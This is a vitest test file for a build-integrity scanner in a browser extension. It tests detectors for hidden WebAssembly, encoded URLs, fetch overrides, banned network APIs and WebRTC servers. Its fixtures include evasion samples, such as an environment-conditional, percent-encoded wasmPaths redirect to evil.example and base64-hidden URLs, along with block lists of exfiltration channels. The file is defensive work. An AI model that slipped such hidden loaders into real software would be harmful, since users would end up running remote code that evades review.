import { describe, expect, it } from 'vitest';
import { randomBytes } from 'node:crypto';
import { readFileSync, readdirSync } from 'node:fs';
import { join } from 'node:path';
import {
  ALLOWED_ORIGINS,
  forbiddenNames,
  hiddenTexts,
  iceServerSchemes,
  windowReaches,
  importsRuntime,
  scriptProblems,
  tamperingPrimitives,
  urlOrigins,
  wasmSignatures,
} from '../../scripts/lib/wasm-scan';
import { stripComments } from '../../scripts/lib/strip-comments';
import { REAL_CHUNK } from './helpers/runtime-chunk';

// WebAssembly can reach a built script as bytes: written out as a literal, base64, hex, an escape or a number list.
// Whatever the spelling, a script of the build that carries the header of a module (\0asm) is refused, unless it is
// one of the pinned vendor files (checked by path and sha256 elsewhere).
describe('wasmSignatures', () => {
  const NUL = String.fromCharCode(0);
  it.each([
    ['the raw header bytes', `var m="${NUL}asm${String.fromCharCode(1)}";`],
    ['a \\0 escape', 'var m="\\0asm\\x01";'],
    ['a \\x00 escape', 'var m="\\x00asm";'],
    ['a \\u0000 escape', 'var m="\\u0000asm";'],
    ['a \\u{0} escape', 'var m="\\u{0}asm";'],
    ['an octal escape', 'var m="\\000asm";'],
    [
      'base64',
      'fetch("data:application/wasm;base64,AGFzbQEAAAABBgFgAX8BfwMCAQAHBwEDYWRkAAAKCQEHACAAQQFqCw==")',
    ],
    ['base64 alone', 'const b="AGFzbQEAAA";'],
    ['a hex string', 'const h="0061736d01000000";'],
    ['a hex string in upper case', 'const h="0061736D01000000";'],
    ['a decimal list', 'new Uint8Array([0,97,115,109,1,0,0,0])'],
    ['a decimal list with spaces', 'new Uint8Array([ 0 , 97 , 115 , 109 ])'],
    ['String.fromCharCode', 'String.fromCharCode(0,97,115,109)'],
    ['a hex list', 'new Uint8Array([0x00,0x61,0x73,0x6d])'],
    ['a hex list in upper case', 'new Uint8Array([0X00,0X61,0X73,0X6D])'],
    ['a mixed list', 'new Uint8Array([0,0x61,115,0b1101101])'],
    ['an octal list', 'new Uint8Array([0,0o141,0o163,0o155])'],
    ['a reference to a .wasm file', 'fetch("https://cdn.example.com/x.wasm")'],
    ['a relative .wasm file', 'new URL("./x.wasm", import.meta.url)'],
  ])('finds %s', (_name, code) => {
    expect(wasmSignatures(code), code).not.toEqual([]);
  });

  it.each([
    'const a=[0,97,115];',
    'const a=[1,97,115,109];',
    'var s="asm.js";',
    'const wasm="webassembly";',
    'x.wasmPaths',
    'const n="AGFzb";',
    'var t="00617365";',
    'const w=document.createElement("wasm-viewer");',
    'return t.slice(0,97)+u.slice(115,109)',
  ])('does not mistake %j for a module', (code) => {
    expect(wasmSignatures(code), code).toEqual([]);
  });
});

describe('scriptProblems: the settings that would make onnxruntime-web load other code or bytes', () => {
  const RESULT = 'assets/result-4HZRFhwR.js';
  const withWasmPaths = (rhs: string) =>
    REAL_CHUNK.replace('.wasm.wasmPaths=I()', `.wasm.wasmPaths=${rhs}`);

  it.each([
    ['not assigned at all', REAL_CHUNK.replace('t.wasm.proxy=!0,', '')],
    ['false', REAL_CHUNK.replace('t.wasm.proxy=!0', 't.wasm.proxy=!1')],
    ['computed', REAL_CHUNK.replace('t.wasm.proxy=!0', 't.wasm.proxy=navigator.webdriver')],
    ['assigned twice', REAL_CHUNK.replace('t.wasm.proxy=!0,', 't.wasm.proxy=!0,t.wasm.proxy=!1,')],
    ['reassigned after the check', `${REAL_CHUNK};o.env.wasm.proxy=!1`],
  ])(
    "rejects proxy %s (the runtime would fetch its files with this page's fetch)",
    (_what, code) => {
      expect(scriptProblems(RESULT, code).join('\n'), code).toContain('proxy must be assigned');
    },
  );

  it('rejects a chunk that imports the runtime and mentions none of its settings', () => {
    const problems = scriptProblems(RESULT, 'import*as o from"../ort/ort.wasm.min.mjs";export{o};');
    expect(problems.join('\n')).toMatch(/proxy must be assigned/);
    expect(problems.join('\n')).toMatch(/start-up check/);
  });

  it('recognises the chunk that imports the vendored runtime', () => {
    expect(importsRuntime(REAL_CHUNK)).toBe(true);
    expect(importsRuntime("import*as o from'../ort/ort.wasm.min.mjs';")).toBe(true);
    for (const other of [
      'import*as o from"../ort/other.mjs";',
      'import*as o from"./ort/ort.wasm.min.mjs";',
      'const a="../ort/ort.wasm.min.mjs";',
    ]) {
      expect(importsRuntime(other), other).toBe(false);
    }
  });

  it('accepts the chunk as the build emits it', () => {
    expect(scriptProblems(RESULT, REAL_CHUNK)).toEqual([]);
  });

  it('accepts the inlined spelling too: the value written in place', () => {
    expect(scriptProblems(RESULT, withWasmPaths('chrome.runtime.getURL("ort/")'))).toEqual([]);
  });

  it.each([
    [
      'a decoded string, conditional on the environment (the review of PR #6)',
      'decodeURI("getManifest"in chrome.runtime&&!navigator.webdriver?"%68ttps://evil.example/ort/":I())',
    ],
    ['a different call', 'g()'],
    ['a call with an argument', 'I("x")'],
    ['another directory', 'chrome.runtime.getURL("ort/x/")'],
    ['another file of the extension', 'chrome.runtime.getURL("ort/ort-wasm-simd-threaded.wasm")'],
    ['a string literal', '"https://evil.example/ort/"'],
    ['a template', '`https://evil.example/ort/`'],
    ['an object', '{wasm:"https://evil.example/x",mjs:I()}'],
    ['a frozen object', 'Object.freeze({mjs:I(),wasm:"https://evil.example/x"})'],
    ['a conditional', 'a?I():"x"'],
    ['a variable', 'where'],
    ['a member', 'cfg.url'],
    ['a sequence', '(0,I())'],
  ])('rejects wasmPaths set from %s', (_what, rhs) => {
    expect(scriptProblems(RESULT, withWasmPaths(rhs)).join('\n'), rhs).toContain('wasmPaths');
  });

  it('rejects a function that returns anything but exactly the packaged directory', () => {
    for (const body of [
      'chrome.runtime.getURL("ort/x")',
      'decodeURI("%68ttps://evil.example/")',
      'chrome.runtime.getURL("ort/")+"x"',
    ]) {
      const chunk = REAL_CHUNK.replace(
        'var I=()=>chrome.runtime.getURL("ort/")',
        `var I=()=>${body}`,
      );
      expect(scriptProblems(RESULT, chunk).join('\n'), body).toContain('wasmPaths');
    }
  });

  it('rejects a second assignment and an undefined function', () => {
    expect(scriptProblems(RESULT, `${REAL_CHUNK};e.wasm.wasmPaths=I()`).join('\n')).toContain(
      'wasmPaths',
    );
    expect(
      scriptProblems(
        RESULT,
        REAL_CHUNK.replace('var I=()=>chrome.runtime.getURL("ort/");', ''),
      ).join('\n'),
    ).toContain('wasmPaths');
    expect(
      scriptProblems(RESULT, `${REAL_CHUNK};var I=()=>chrome.runtime.getURL("ort/")`).join('\n'),
    ).toContain('wasmPaths');
  });

  it('rejects a chunk without the start-up check, or without the call of it', () => {
    const noCall = REAL_CHUNK.replace('(o.env,I())', '()');
    expect(scriptProblems(RESULT, noCall).join('\n')).toContain('start-up check');
    const wrongArgument = REAL_CHUNK.replace('(o.env,I())', '(o.env,"x")');
    expect(scriptProblems(RESULT, wrongArgument).join('\n')).toContain('start-up check');
    const noMessages = REAL_CHUNK.replaceAll('Refusing to start: ', 'Stop: ');
    expect(scriptProblems(RESULT, noMessages).join('\n')).toMatch(
      /start-up check|wasmPaths|wasmBinary/,
    );
    const inlined = withWasmPaths('chrome.runtime.getURL("ort/")').replace(
      '(o.env,I())',
      '(o.env,chrome.runtime.getURL("ort/"))',
    );
    expect(scriptProblems(RESULT, inlined)).toEqual([]);
  });

  it('rejects any other mention of the two names in that chunk', () => {
    for (const extra of [
      'x.wasmBinary=b',
      'use(o.env.wasm.wasmPaths)',
      'const{wasmPaths:p}=o.env.wasm',
      'init({wasmPaths:u})',
      'Reflect.set(o.env.wasm,"wasmBinary",b)',
    ]) {
      expect(scriptProblems(RESULT, `${REAL_CHUNK};${extra}`).join('\n'), extra).toMatch(
        /wasmPaths|wasmBinary/,
      );
    }
  });

  it.each([
    'assets/welcome-abc.js',
    'assets/i18n-abc.js',
    'background.js',
    'select.js',
    'assets/ort/result-abc.js',
    'result-abc.js',
  ])('rejects the two names in %s, which does not configure the runtime', (file) => {
    expect(scriptProblems(file, 'o.env.wasm.wasmPaths=I()').join('\n')).toContain('wasmPaths');
    expect(scriptProblems(file, 'o.env.wasm.wasmBinary=b').join('\n')).toContain('wasmBinary');
  });

  it('reports a module header in any script', () => {
    expect(scriptProblems('assets/x.js', 'new Uint8Array([0,97,115,109])').join('\n')).toMatch(
      /WebAssembly module/,
    );
  });

  it('has nothing to say about an ordinary script', () => {
    expect(scriptProblems('assets/x.js', 'export const a=1;function f(){return[0,1,2,3]}')).toEqual(
      [],
    );
  });
});

describe('a .wasm file named in any string form', () => {
  it.each([
    ['a string', 'fetch("https://cdn.example.com/x.wasm")'],
    ['single quotes', "fetch('x.wasm')"],
    ['a template', 'fetch(`x.wasm`)'],
    ['the bare extension, for a concatenation', 'const u=base+".wasm";'],
    ['a query', 'fetch("x.wasm?v=1")'],
    ['a fragment', 'fetch("x.wasm#a")'],
    ['upper case', 'fetch("X.WASM")'],
    ['a \\x2e escape', 'fetch("x\\x2ewasm")'],
    ['a \\u002e escape', 'fetch("x\\u002ewasm")'],
    ['a \\u{2e} escape', 'fetch("x\\u{2e}wasm")'],
    ['a percent escape', 'fetch("x%2ewasm")'],
    ['a percent escape in upper case', 'fetch("x%2Ewasm")'],
    ['an escaped "w"', 'fetch("x.\\u0077asm")'],
    ['a double percent escape', 'fetch("x%252ewasm")'],
  ])('finds %s', (_what, code) => {
    expect(wasmSignatures(code), code).toContain('a reference to a .wasm file');
  });

  it.each([
    'import*as o from"../ort/ort.wasm.min.mjs";',
    'o.env.wasm.wasmPaths=I()',
    'const w="wasm";',
    'const w=".wasmx";',
    'const w="the wasm file";',
    'x.wasm',
  ])('does not mistake %s for a module file', (code) => {
    expect(wasmSignatures(code), code).not.toContain('a reference to a .wasm file');
  });
});

describe('base64 of a module header at any alignment', () => {
  const HEADER = Buffer.from([0, 0x61, 0x73, 0x6d, 1, 0, 0, 0]);
  it.each([0, 1, 2, 3, 4, 5])('is found after %i bytes of anything', (before) => {
    for (let i = 0; i < 20; i++) {
      const base64 = Buffer.concat([randomBytes(before), HEADER, randomBytes(7)]).toString(
        'base64',
      );
      expect(wasmSignatures(`const w="${base64}";`), base64).toContain('base64 of a module header');
    }
  });

  it('is found in a data: URL and in base64url', () => {
    const base64 = Buffer.concat([randomBytes(2), HEADER, randomBytes(6)]).toString('base64url');
    expect(wasmSignatures(`x("data:application/wasm;base64,${base64}")`)).not.toEqual([]);
  });

  it('does not fire on ordinary base64 text', () => {
    for (let i = 0; i < 200; i++) {
      expect(wasmSignatures(`const w="${randomBytes(24).toString('base64')}";`)).toEqual([]);
    }
  });
});

describe('absolute URLs in built scripts', () => {
  it('allows only the Google Fonts hosts the page links to', () => {
    expect([...ALLOWED_ORIGINS].sort()).toEqual(['fonts.google.com', 'fonts.googleapis.com']);
    expect(urlOrigins('x="https://fonts.googleapis.com/css2?family=A&display=swap"')).toEqual([
      'fonts.googleapis.com',
    ]);
    expect(urlOrigins('x=`https://fonts.google.com/specimen/${n}`')).toEqual(['fonts.google.com']);
  });

  it.each([
    ['https://evil.example/ort/', 'evil.example'],
    ['http://evil.example/ort/', 'evil.example'],
    ['//evil.example/ort/', 'evil.example'],
    ['HTTPS://EVIL.EXAMPLE/x', 'evil.example'],
    ['wss://evil.example/s', 'evil.example'],
    ['ftp://evil.example/x', 'evil.example'],
    ['blob:https://evil.example/uuid', 'evil.example'],
    ['https://user:pw@evil.example:8443/x', 'evil.example'],
    ['%68ttps://evil.example/ort/', 'evil.example'],
    ['\\x68ttps://evil.example/ort/', 'evil.example'],
    ['\\u0068ttps://evil.example/ort/', 'evil.example'],
    ['https:%2f%2fevil.example/x', 'evil.example'],
    ['https%3A%2F%2Fevil.example%2Fx', 'evil.example'],
    ['http://127.0.0.1:8000/x', '127.0.0.1'],
    ['https://fonts.googleapis.com.evil.example/x', 'fonts.googleapis.com.evil.example'],
    ['https://evilfonts.google.com/x', 'evilfonts.google.com'],
    ['https://fonts-gstatic.com/x', 'fonts-gstatic.com'],
    ['https://fonts.gstatic.com.evil.example/x', 'fonts.gstatic.com.evil.example'],
    ['https://fonts.googleapis.com@evil.example/x', 'evil.example'],
    ['https://fonts.googleapis.com:pw@evil.example/x', 'evil.example'],
    ['https://fonts.googleapis.com\\@evil.example/x', 'evil.example'],
    ['https://xfonts.googleapis.com/x', 'xfonts.googleapis.com'],
    ['https://fonts.googleapis.com.cn/x', 'fonts.googleapis.com.cn'],
    ['https://fonts.google.com.evil.example/x', 'fonts.google.com.evil.example'],
    ['https://fonts.googleapis.co/x', 'fonts.googleapis.co'],
  ])('finds %s', (url, host) => {
    for (const quote of ['"', "'", '`']) {
      expect(urlOrigins(`const u=${quote}${url}${quote};`), url).toContain(host);
    }
  });

  it('refuses fonts.gstatic.com when a script names it: the font files arrive in the CSS of Google, no script has the host', () => {
    expect(ALLOWED_ORIGINS.has('fonts.gstatic.com')).toBe(false);
    expect(
      scriptProblems('assets/x.js', 'fetch("https://fonts.gstatic.com/s/x.woff2")').join('\n'),
    ).toContain('names a URL on fonts.gstatic.com');
  });

  it('names exactly the two Google Fonts hosts in the sources of the extension (render.ts), and no other', () => {
    const hosts = new Set<string>();
    const visit = (dir: string): void => {
      for (const entry of readdirSync(dir, { withFileTypes: true })) {
        const path = join(dir, entry.name);
        if (entry.isDirectory()) visit(path);
        // src/manifest.ts is the build's, not a script of the extension (its e2e-only loopback permission names 127.0.0.1)
        else if (
          path.endsWith('.ts') &&
          !path.endsWith('.d.ts') &&
          path !== join('src', 'manifest.ts')
        ) {
          for (const host of urlOrigins(stripComments(readFileSync(path, 'utf8'), path))) {
            hosts.add(host);
          }
        }
      }
    };
    visit('src');
    // the CSS of fonts.googleapis.com names fonts.gstatic.com; the extension never does
    expect([...hosts].sort()).toEqual([...ALLOWED_ORIGINS].sort());
  });

  it('is reported by scriptProblems with the host', () => {
    const problems = scriptProblems('assets/x.js', 'fetch("https://evil.example/ort/")').join('\n');
    expect(problems).toContain('evil.example');
    expect(problems).toContain('fonts.googleapis.com');
    expect(
      scriptProblems('assets/x.js', 'const u="https://fonts.googleapis.com/css2?family=A";'),
    ).toEqual([]);
  });

  it('has nothing to say about text without a host', () => {
    expect(urlOrigins('const a="a//b",c="http://",d="x:y";')).toEqual([]);
  });
});

describe('primitives that replace what the runtime relies on, in a built script', () => {
  it.each([
    'Object.defineProperty(globalThis,"fetch",{value:f})',
    'Object.defineProperties(window,d)',
    'Object.setPrototypeOf(x,y)',
    'x.__proto__=y',
    'x.__defineGetter__("a",f)',
    'Reflect.set(globalThis,"fetch",f)',
    'Reflect.defineProperty(self,"fetch",d)',
    'globalThis.fetch=f',
    'self.fetch=f',
    'window["fetch"]=f',
    'globalThis.counter+=1',
    'Response.prototype.arrayBuffer=f',
    'Promise.prototype["then"]=f',
    'x.prototype.y=1',
  ])('finds %s', (code) => {
    expect(tamperingPrimitives(code), code).not.toEqual([]);
    expect(scriptProblems('assets/x.js', code).join('\n'), code).toMatch(/replaces|changes/);
  });

  it.each([
    'const a=globalThis.crossOriginIsolated?1:0',
    'globalThis.crypto.randomUUID()',
    'window.devicePixelRatio||1',
    'if(globalThis.a==1)b()',
    'x.prototypeless=1',
    'const o={defineProp:1}',
    'self.setTimeout(f,1)',
    'Object.getOwnPropertyDescriptor(n,"wasmPaths")',
  ])('lets %s through', (code) => {
    expect(tamperingPrimitives(code), code).toEqual([]);
  });
});

// Review round 3 of PR #6: `atob('aHR0cHM6Ly9ldmls...')` and a `.wasm` name in base64 were invisible to the scan, which looked at
// the spelling of URLs and headers only. A literal that DECODES to one is refused now, at every alignment of the encoding.
describe('hiddenTexts: a URL or a module that is written in an encoded form', () => {
  const b64 = (text: string, before = 0): string =>
    Buffer.from('x'.repeat(before) + text, 'latin1').toString('base64');
  const b64url = (text: string): string =>
    Buffer.from(text, 'latin1').toString('base64url').replace(/=+$/, '');
  const hex = (text: string): string => Buffer.from(text, 'latin1').toString('hex');
  const bytes = (text: string): string => [...Buffer.from(text, 'latin1')].join(',');

  it.each([
    ['base64 of an https URL', `fetch(atob("${b64('https://evil.example/ort/')}"))`],
    ['base64 of an http URL', `x("${b64('http://127.0.0.1:8000/b.wasm')}")`],
    ['base64 of a protocol-relative URL', `x("${b64('//evil.example/b')}")`],
    ['base64 of a .wasm name', `x("${b64('ort-wasm-simd-threaded.wasm')}")`],
    ['base64 of a name with a query', `x("${b64('b.wasm?v=2')}")`],
    ['base64url', `x("${b64url('https://evil.example/?a=b>c')}")`],
    ['base64 after one filler byte', `x("${b64('https://evil.example/', 1)}")`],
    ['base64 after two filler bytes', `x("${b64('https://evil.example/', 2)}")`],
    ['base64 after three filler bytes', `x("${b64('https://evil.example/', 3)}")`],
    [
      'base64 with other text around it in the literal',
      `x("data:;base64,${b64('https://evil.example/')}")`,
    ],
    ['hex of a URL', `x("${hex('https://evil.example/')}")`],
    ['hex of a .wasm name', `x("${hex('a.wasm')}")`],
    ['a list of bytes of a URL', `new Uint8Array([${bytes('https://evil.example/')}])`],
    ['a list of bytes of a .wasm name', `x([${bytes('b.wasm')},0])`],
    ['a template literal', 'x(`' + b64('https://evil.example/') + '`)'],
    [
      'an escaped base64 literal',
      `x("${b64('https://evil.example/').replace(/^./, (c) => `\\x${c.charCodeAt(0).toString(16)}`)}")`,
    ],
  ])('finds %s', (_what, code) => {
    expect(hiddenTexts(code), code).not.toEqual([]);
    expect(scriptProblems('assets/result-abc.js', code).join('\n'), code).toMatch(/decodes to/);
  });

  it.each([
    ['base64 of an allowed host', `x("${b64('https://fonts.googleapis.com/css2')}")`],
    ['base64 of plain words', `x("${b64('Refusing to start: proxy must be true')}")`],
    ['an identifier-like word', 'x("getOwnPropertyDescriptor"); y("Uint8ClampedArray")'],
    ['a camel-case name', 'const n = "createImageBitmapWithOptions"'],
    ['hex that is not text', 'const h = "00ff00ff00ff00ff00ff00ff"'],
    ['a short list of numbers', 'const a = [104, 116, 116, 112]'],
    ['numbers with a fraction', 'const m = [0.485, 0.456, 0.406, 1, 2, 3, 4, 5, 6, 7, 8]'],
    ['long numbers of the model', 'const v = [1000, 2000, 3000, 4000, 5000, 6000, 7000, 8000]'],
  ])('does not mistake %s for a hidden URL', (_what, code) => {
    expect(hiddenTexts(code), code).toEqual([]);
  });

  it('accepts the build of the extension as it is', () => {
    expect(hiddenTexts(REAL_CHUNK)).toEqual([]);
  });
});

describe('forbiddenNames: what no script of the build uses', () => {
  it.each([
    'XMLHttpRequest',
    'WebSocket',
    'EventSource',
    'sendBeacon',
    'importScripts',
    'SharedWorker',
    'Worker',
    'BroadcastChannel',
    'MessageChannel',
    'postMessage',
    'TextDecoder',
    'atob',
    'unescape',
    'decodeURI',
    'fromCodePoint',
    'webdriver',
    'setResourceTimingBufferSize',
    'clearResourceTimings',
    'WebAssembly',
    'instantiateStreaming',
    'compileStreaming',
  ])('refuses %s', (name) => {
    for (const code of [`${name}(x)`, `new ${name}("a")`, `a.${name}(1)`, `a["${name}"]`]) {
      expect(forbiddenNames('assets/result-abc.js', code), code).toContain(name);
      expect(forbiddenNames('background.js', code), code).toContain(name);
    }
  });

  it('refuses a dynamic import() and the words inside a longer name only when they stand alone', () => {
    expect(forbiddenNames('assets/a.js', 'import ( u )')).toEqual(['import(']);
    expect(forbiddenNames('assets/a.js', 'const y = import(u)')).toEqual(['import(']);
    expect(
      forbiddenNames('assets/a.js', 'decodeURIComponent(s); myWorkerCount; atoms; webdrivers'),
    ).toEqual([]);
  });

  it.each([
    "new Function('return this')()",
    "Function('return this')()",
    'eval(code)',
    '(0,eval)(code)',
  ])('refuses code built at run time: %s', (code) => {
    expect(forbiddenNames('assets/result-abc.js', code), code).not.toEqual([]);
  });

  it.each([
    ['select.js', 'void window.fetch("https://example.invalid/m")'],
    ['select.js', 'new Request("https://example.invalid/m")'],
    ['select.js', 'const f=window["fetch"];'],
    ['assets/welcome-abc.js', 'fetch(u)'],
    ['assets/errors-abc.js', 'fetch(u)'],
    ['assets/other-abc.js', 'new Request(u)'],
    ['assets/result-abc.mjs', 'fetch(u)'],
    ['assets/x/result-abc.js', 'fetch(u)'],
    ['result.js', 'fetch(u)'],
    ['dist/background.js.map', 'fetch(u)'],
    ['assets/background-abc.js', 'fetch(u)'],
  ])(
    'refuses fetch and Request outside background.js and the result chunk: %s: %s',
    (file, code) => {
      expect(forbiddenNames(file, code), `${file}: ${code}`).not.toEqual([]);
      expect(scriptProblems(file, code).join('\n')).toMatch(/uses (fetch|Request)/);
    },
  );

  it.each(['background.js', 'assets/result-4HZRFhwR.js', 'assets/result-a_b-C.js'])(
    'allows fetch and Request in %s (allowed, not required)',
    (file) => {
      expect(forbiddenNames(file, 'fetch(u); new Request(u)')).toEqual([]);
      expect(forbiddenNames(file, 'const a=1')).toEqual([]);
    },
  );

  it('lets only the service worker encode the screenshot with btoa and fromCharCode', () => {
    expect(forbiddenNames('background.js', 'btoa(String.fromCharCode(...b))')).toEqual([]);
    expect(forbiddenNames('assets/result-abc.js', 'btoa(String.fromCharCode(...b))')).toEqual([
      'btoa',
      'fromCharCode',
    ]);
    expect(forbiddenNames('select.js', 'btoa(x)')).toEqual(['btoa']);
    expect(forbiddenNames('assets/background-abc.js', 'btoa(x)')).toEqual(['btoa']);
  });

  it('is part of the problems of a script, with the file named', () => {
    expect(scriptProblems('assets/result-abc.js', 'new Worker(u)').join('\n')).toContain(
      'assets/result-abc.js: uses Worker',
    );
  });
});

describe('windowReaches: the Window of a document is held in the page scripts, once, and nowhere else', () => {
  const PAGE = 'assets/result-abc.js';
  const LEGIT = 'x();const a=o.defaultView;if(!a)return;a.addEventListener("hashchange",r);';

  it('accepts the one form of the result and welcome pages', () => {
    expect(windowReaches(PAGE, LEGIT)).toEqual([]);
    expect(windowReaches('assets/welcome-Xy_9.js', LEGIT)).toEqual([]);
  });

  it.each([
    ['assigned to', 'Object.assign(document.defaultView,{fetch:f});'],
    ['passed on', 'use(o.defaultView);'],
    ['aliased', 'const w=o.defaultView;w.fetch=f;'],
    ['read twice', `${LEGIT}${LEGIT}`],
    ['a computed name', 'o["defaultView"]'],
    ['destructured', 'const{defaultView:w}=o;'],
  ])('refuses defaultView %s', (_what, code) => {
    expect(windowReaches(PAGE, code), code).not.toEqual([]);
  });

  it.each([
    'background.js',
    'select.js',
    'assets/errors-abc.js',
    'assets/other-abc.js',
    'assets/result-abc.mjs',
  ])('refuses even the legitimate form in %s', (file) => {
    expect(windowReaches(file, LEGIT)).not.toEqual([]);
  });

  it.each([
    'contentWindow',
    'getBackgroundPage',
    'getViews',
    'currentTarget',
    'composedPath',
    'relatedTarget',
    'srcElement',
  ])('refuses %s anywhere in the build', (name) => {
    expect(forbiddenNames(PAGE, `a.${name}`)).toContain(name);
  });
});

// Round 5, the tester: a STUN or TURN server is named `stun:host:port`, no `//`, so it was no URL for the host scan, and
// RTCPeerConnection left the page for the internet through a lint-clean build.
describe('WebRTC: servers and names that no script of the build uses', () => {
  const RESULT = 'assets/result-abc.js';

  it.each([
    ['stun', "new RTCPeerConnection({iceServers:[{urls:'stun:example.invalid:3478'}]})"],
    ['turn', 'x("turn:example.invalid:3478")'],
    ['turns', "x('turns:example.invalid:5349?transport=tcp')"],
    ['stun', 'x("STUN:example.invalid")'],
    ['turn', 'x("Turn:example.invalid")'],
    ['turns', 'x("TURNS:example.invalid")'],
    ['stun', 'x(`stun:example.invalid:${port}`)'],
    ['stun', 'x("\\x73tun:example.invalid")'],
    ['stun', 'x("stun%3Aexample.invalid".replace("%3A",":")+"stun:a")'],
    // what terser leaves after folding 'st' + 'un:' + host into one literal
    ['stun', 'x("stun:example.invalid:3478")'],
    ['stun', 'x(["stun:example.invalid"])'],
  ])('finds %s: %s', (scheme, code) => {
    expect(iceServerSchemes(code), code).toContain(scheme);
    expect(scriptProblems(RESULT, code).join('\n'), code).toContain('names a WebRTC server');
  });

  it.each([
    'const a="return:value"',
    'const b="subturn:x"',
    'const a="stunning:x"',
    'const a="rstun:x"',
    'x("turnover")',
    'x("the state: stun")',
    'x("https://fonts.googleapis.com/css2?family=A")',
  ])('does not mistake %j for a server', (code) => {
    expect(iceServerSchemes(code), code).toEqual([]);
  });

  it.each([
    'RTCPeerConnection',
    'webkitRTCPeerConnection',
    'mozRTCPeerConnection',
    'RTCDataChannel',
    'RTCIceCandidate',
    'RTCSessionDescription',
    'RTCRtpSender',
    'RTCCertificate',
    'WebTransport',
    'WebTransportDatagramDuplexStream',
  ])('refuses the name %s anywhere in the build', (name) => {
    for (const code of [`new ${name}({})`, `a.${name}`, `a["${name}"]`, `typeof ${name}`]) {
      expect(forbiddenNames(RESULT, code), code).toContain(name);
      expect(forbiddenNames('background.js', code), code).toContain(name);
      expect(forbiddenNames('select.js', code), code).toContain(name);
    }
  });

  it('does not take other names for them', () => {
    expect(
      forbiddenNames(RESULT, 'const RTCount=1; const myRTCPeer=2; RTC; rtcPeerConnection()'),
    ).toEqual([]);
  });

  it('is part of the problems of a script, with the file named', () => {
    const problems = scriptProblems(
      RESULT,
      "new RTCPeerConnection({iceServers:[{urls:'stun:example.invalid:3478'}]})",
    ).join('\n');
    expect(problems).toContain('assets/result-abc.js: uses RTCPeerConnection');
    expect(problems).toContain('assets/result-abc.js: names a WebRTC server (stun:)');
  });
});
